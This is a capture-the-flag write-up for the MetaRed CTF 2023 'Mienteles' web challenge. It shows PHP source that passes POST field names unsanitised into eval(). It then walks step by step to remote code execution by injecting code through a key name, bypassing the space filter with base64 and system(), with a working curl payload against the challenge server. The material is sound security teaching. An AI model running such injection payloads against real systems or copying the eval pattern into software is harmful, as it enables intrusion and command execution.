# MetaRed CTF 2023 - Mienteles

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

In this challenge we given the source code, let's just see the source code.

```php
 <?php

if(isset($_GET['src'])){
    highlight_file(__FILE__);
    die();
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mienteles Telecomunicaciones</title>
    
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
</head>
<body>
    
    <nav class="navbar navbar-expand-lg navbar-dark" style="background-color:#005F9F">
        <a class="navbar-brand">Mienteles</a>
        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
            <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarNav">
            <ul class="navbar-nav">
                <li class="nav-item active">
                    <a class="nav-link" href="#">Inicio</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" href="#">Servicios</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" href="#">Contacto</a>
                </li>
            </ul>
        </div>
    </nav>

    
 
    <div class="text-center">
        <img src="./mienteles.svg" alt="">
    </div>
    
    <section class="py-5">
        <div class="container">
            <h2 class="text-center">Nuestros Servicios</h2>
            <div class="row">
                
                <div class="col-md-4">
                    <div class="card">
                        <img src="servicio1.jpg" class="card-img-top" alt="Servicio 1" style="height:518px">
                        <div class="card-body">
                            <h5 class="card-title">Bug Bounty Program</h5>
                            <p class="card-text">Tenemos publicado nuestro programa de Bug Bounty. Si encuentras un RCE, no te pagamos :).</p>
                        </div>
                    </div>
                </div>
                
                <div class="col-md-4">
                    <div class="card">
                        <img src="servicio2.jpg" class="card-img-top" alt="Servicio 2" style="height:518px">
                        <div class="card-body">
                            <h5 class="card-title">Internet</h5>
                            <p class="card-text">Tenemos planes de internet para usted</p>
                        </div>
                    </div>
                </div>
                
                <div class="col-md-4">
                    <div class="card">
                        <img src="servicio3.jpg" class="card-img-top" alt="Servicio 3"  style="height:518px">
                        <div class="card-body">
                            <h5 class="card-title">Flag</h5>
                            <p class="card-text">Aquí estará tu flag: </p>
                            <!-- Accede a ?src -->
                            <?php
                                error_reporting(0);
                                if ($_POST['keyl']==md5(date('Y-m-d'))){
                                            foreach($_POST as $name => $value){        
                                                $assign = "\$" . $name . "='".preg_replace('([^A-Za-z0-9@. _-])', '', $value)."';";
                                                eval($assign);
                                            }
                                }
                                else{
                                    echo "No podes hackearme";
                                }

                            ?>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>

    
    <footer class="footer text-white text-center py-3" style="background-color:#005F9F">
        <div class="container">
            <p>&copy; 2023 Mienteles Telecomunicaciones. Todos los derechos reservados.</p>
        </div>
    </footer>

    
    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
</body>
</html>

```

From the source code, we know that to get the flag we need to do post request with key keyl which is must to be equal to \`md5(date('Y-m-d'))\`.

We know using md5 function potential to hash collision and in the code the program is md5 hashed date of current date, which mean it's easy to get the hash by using php to do md5 hash.

{% code title="md5.php" lineNumbers="true" %}
```php
<?php
    echo md5(date('Y-m-d'));
?>
```
{% endcode %}

And then in local i created replicated php code like on server.

{% code title="index.php" lineNumbers="true" %}
```php
<?php
    if ($_POST['keyl']==md5(date('Y-m-d'))){
                foreach($_POST as $name => $value){        
                    $assign = "\$" . $name . "='".preg_replace('([^A-Za-z0-9@. _-])', '', $value)."';";
                    echo $assign;
                    eval($assign);
                }
    }
    else{
        echo "No podes hackearme";
    }
?>
```
{% endcode %}

And just run the index.php and used result from md5.php as value of key \`keyl\` post data.

<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

As you can see, the local server return with `$keyl='6bde8c88ffee17ea27c8e281299dcf47';` which our post data is set as variable and value in php and based on the source code, the result will used in `eval` function which is we know the `eval` function is evil.

Then i try add more post data and if i try to called function system as post value, our input got cleaned.

<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

After try a few times, i realized that we can manipulate the key post data. For basic i try add \`'\` in key value and i got something interesting.

<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

The result return with `$cmd'` and the local server is crashed/error, maybe we can get remote code execution from it, after try a few times finaly i can make the local server return with proper php code and the local server is not crashed/error.

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

But we have problem, if we try to run command with space it will replace it with `_` .

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

But we can bypass it by base64 encoded the command.

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

and we can try it on server using below command.

```sh
curl -X POST https://mienteles.ctf.cert.unlp.edu.ar/ --data "keyl=6bde8c88ffee17ea27c8e281299dcf47&cmd;system(base64_decode('bHMgLWxhCg'));//'=12);"
```

And we successfully get remote code execution.

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

Flag: flag{N1c3!No\_B0untY\_But\_Th1s\_1s\_ur\_fl4G}
